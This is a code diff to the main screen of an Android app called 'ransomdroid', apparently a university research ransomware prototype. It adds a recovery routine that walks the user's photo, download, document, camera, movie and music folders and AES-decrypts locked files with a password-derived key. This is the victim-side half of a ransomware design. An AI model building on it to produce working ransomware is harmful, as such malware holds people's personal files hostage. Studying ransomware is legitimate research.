@@ -17,8 +17,18 @@ import android.widget.Toast;
 
 import com.google.android.gms.common.api.GoogleApiClient;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
+
 import br.unb.lasp.Global;
 import br.unb.lasp.ransomdroid.R;
+import br.unb.lasp.util.Storage;
+import br.unb.lasp.util.SymmetricAES;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -55,7 +65,7 @@ public class MainActivity extends AppCompatActivity {
         mEvaluateButton.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View view) {
-                decrypt(mPassTextView.getText().toString());
+                recover(mPassTextView.getText().toString());
             }
         });
         mEvaluateButton.setVisibility(View.INVISIBLE);
@@ -76,13 +86,6 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onStop() {
         super.onStop();
-    }
-
-    public void decrypt(String pass){
-        Log.d(new Object() {
-        }.getClass().getName(), new Object() {
-        }.getClass().getEnclosingMethod().getName());
-        Toast.makeText(MainActivity.this, pass, Toast.LENGTH_SHORT).show();
     }
 
     public class UpdateFieldsTask extends AsyncTask<Void, Void, Boolean> {
@@ -172,6 +175,83 @@ public class MainActivity extends AppCompatActivity {
             mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
         }
 
+    }
+
+    private void recover(String pass){
+        Log.d(new Object() {
+        }.getClass().getName(), new Object() {
+        }.getClass().getEnclosingMethod().getName());
+
+        if(!Storage.isExternalStorageWritable()){
+            Toast.makeText(MainActivity.this, "FileSystem Error", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        // get files
+        List<File> dirList = new ArrayList<>();
+        dirList.add(Storage.getPicturesDir());
+        dirList.add(Storage.getDownloadsDir());
+        dirList.add(Storage.getDocumentsDir());
+        dirList.add(Storage.getDCIMSDir());
+        dirList.add(Storage.getMoviesDir());
+        dirList.add(Storage.getMusicsDir());
+        List<File> fileList = new ArrayList<>();
+        for (File dir : dirList) {
+            if (dir != null) {
+                fileList.addAll(Storage.listTmpFilesRecursively(dir, new ArrayList<File>()));
+            }
+        }
+
+        for(File file: fileList){
+
+            // get input
+            byte[] input = null;
+            try {
+                FileInputStream fis = new FileInputStream(file);
+                input = new byte[fis.available()];
+                while (fis.read(input) != -1) {
+                    // do nothing, just read
+                }
+                fis.close();
+            } catch (FileNotFoundException e) {
+                Log.e(TAG, e.getMessage(), e);
+            } catch (IOException e) {
+                Log.e(TAG, e.getMessage(), e);
+            } catch (Exception e) {
+                Log.e(TAG, e.getMessage(), e);
+            }
+
+            // parse
+            input = SymmetricAES.decrypt(input, SymmetricAES.getSecretKeySpec(Global.uid, pass));
+//                files.delete();
+
+            // create output
+            File nFile = new File(file.getParent(), file.getName() + ".tmp");
+            if (nFile.exists()) {
+                nFile.delete();
+            }
+
+            FileOutputStream fos = null;
+            try {
+                fos = new FileOutputStream(nFile);
+                fos.write(input);
+                fos.flush();
+                fos.close();
+            } catch (Exception e) {
+                Log.e(TAG, e.getMessage(), e);
+            }finally {
+                if (fos != null) {
+                    try {
+                        fos.close();
+                    } catch (IOException e) {
+                        Log.e(TAG, e.getMessage(), e);
+                    }
+                }
+            }
+
+        }
+
+        Toast.makeText(MainActivity.this, "Recovered Files: " + fileList().length, Toast.LENGTH_SHORT).show();
     }
 
 }
